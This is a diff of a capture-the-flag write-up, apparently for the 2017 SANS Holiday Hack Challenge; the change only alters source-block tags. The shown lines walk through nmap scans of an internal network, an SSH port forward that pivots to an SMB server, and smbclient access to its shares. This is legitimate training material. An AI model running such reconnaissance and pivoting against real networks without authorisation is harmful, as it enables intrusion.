@@ -24,7 +24,7 @@ through the Letters to Santa system.
 
 The question mentions pivoting through the Letters to Santa server (=l2s=). A commonly used tool for network discovery is =nmap=, and we can check that it's available on =l2s=:
 
-#+BEGIN_SRC sh
+#+BEGIN_SRC
 alabaster_snowball@hhc17-apache-struts1:/tmp/asnow.VmaV55tqZi5rteO9fXHB3kjM$ nmap -V
 
 Nmap version 7.40 ( https://nmap.org )
@@ -73,7 +73,7 @@ vulnerabilities and allow for a better understanding of the target
 network, all without raising alarm bells.
 #+END_QUOTE
 
-#+BEGIN_SRC sh
+#+BEGIN_SRC
 alabaster_snowball@hhc17-apache-struts1:/tmp/asnow.sjKK74OSjKfIxlr5otQil8yd$ nmap -sL 10.142.0.0/24
 
 Starting Nmap 7.40 ( https://nmap.org ) at 2018-01-08 02:40 UTC
@@ -113,7 +113,7 @@ One of the systems is named =hhc17-smb-server=.
 
 Continuing with the overview, we can now narrow in on a single IP:
 
-#+BEGIN_SRC sh
+#+BEGIN_SRC
 alabaster_snowball@hhc17-apache-struts1:/tmp/asnow.sjKK74OSjKfIxlr5otQil8yd$ nmap -p- -PS445 -A -T4 -oA avatartcpscan-%D 10.142.0.7
 
 Starting Nmap 7.40 ( https://nmap.org ) at 2018-01-08 02:51 UTC
@@ -159,20 +159,20 @@ Nmap done: 1 IP address (1 host up) scanned in 205.99 seconds
 
 So it does indeed seem to be an SMB server. A command-line tool to access it is =smbclient=:
 
-#+BEGIN_SRC sh
+#+BEGIN_SRC
 alabaster_snowball@hhc17-apache-struts1:/tmp/asnow.sjKK74OSjKfIxlr5otQil8yd$ smbclient -L 10.142.0.7 -U alabaster_snowball
 rbash: smbclient: command not found
 #+END_SRC
 
 It's not available on =l2s=. Another option is forwarding a port through SSH:
 
-#+BEGIN_SRC sh
+#+BEGIN_SRC
 user@vps $ ssh alabaster_snowball@l2s.northpolechristmastown.com -O forward -L 4445:10.142.0.7:445
 #+END_SRC
 
 Now we can access port 445 on =hhc17-smb-server= via port 4445 on =localhost=:
 
-#+BEGIN_SRC sh
+#+BEGIN_SRC
 user@vps $ smbclient -L localhost -p 4445 -U alabaster_snowball
 WARNING: The "syslog" option is deprecated
 Enter alabaster_snowball's password: 
@@ -190,7 +190,7 @@ NetBIOS over TCP disabled -- no workgroup available
 
 =FileStor= looks interesting. Let's see what's on it:
 
-#+BEGIN_SRC sh
+#+BEGIN_SRC
 user@vps $ smbclient //localhost/FileStor -p 4445 -U alabaster_snowball
 WARNING: The "syslog" option is deprecated
 Enter alabaster_snowball's password:
